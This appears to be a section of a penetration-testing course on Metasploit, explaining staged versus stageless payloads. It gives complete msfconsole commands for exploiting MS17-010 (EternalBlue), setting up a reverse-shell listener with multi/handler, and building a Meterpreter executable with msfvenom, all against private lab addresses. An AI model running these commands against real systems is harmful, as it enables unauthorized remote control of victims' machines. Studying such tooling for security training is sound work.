1. Metasploit Architecture: Exploit vs Payload

Metasploit decouples the delivery mechanism (the exploit) from the code that executes after successful compromise (the payload):

  • Exploit: The software module that takes advantage of a flaw (e.g. buffer overflow, format string bug) to hijack the target's instruction pointer (EIP/RIP).
  • Staged Payload (/): A tiny initial shellcode stub (Stage 1) injected into the buffer, which connects back to Kali and downloads the full Meterpreter DLL (Stage 2) directly into memory.
  • Stageless Payload (_): A standalone, self-contained binary containing all payload features at once.

2. Case Study: Exploiting MS17-010 (EternalBlue)

CVE-2017-0144 exploits a memory corruption flaw in Microsoft's Server Message Block 1.0 (SMBv1) driver (srv.sys), allowing unauthenticated remote attackers to execute arbitrary shellcode with NT AUTHORITY\SYSTEM privileges.

msfconsole — EternalBlue Arming Sequence 
# Launch Metasploit
msfconsole -q

# Select EternalBlue exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Configure target and attacker IPs
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.56.101
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.56.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Fire exploit payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

3. Staging Independent Listeners with multi/handler

When executing payloads deployed through client-side vectors, scheduled tasks, or external scripts, configure a standalone listener:

msfconsole — Generic Multi-Handler Setup 
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.100
set LPORT 4444
exploit -j -z

4. Binary Payload Generation with msfvenom

msfvenom synthesizes Metasploit payloads with custom encodings, formats, and bad-character filtering:

bash — msfvenom Executable Generation 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o payload_x64.exe
Thought Question: Why are staged payloads preferred when attacking tight buffer overflows?

In many software buffer overflow vulnerabilities, the amount of memory allocated to the overflowed buffer is extremely small (e.g. 200–400 bytes). A full, stageless Meterpreter binary requires roughly 1 Megabyte of memory—far too large to fit in the original vulnerable buffer. Staged payloads solve this: Stage 1 is tiny (often under 300 bytes), just large enough to call connect() and load the full Meterpreter engine into allocated heap space.
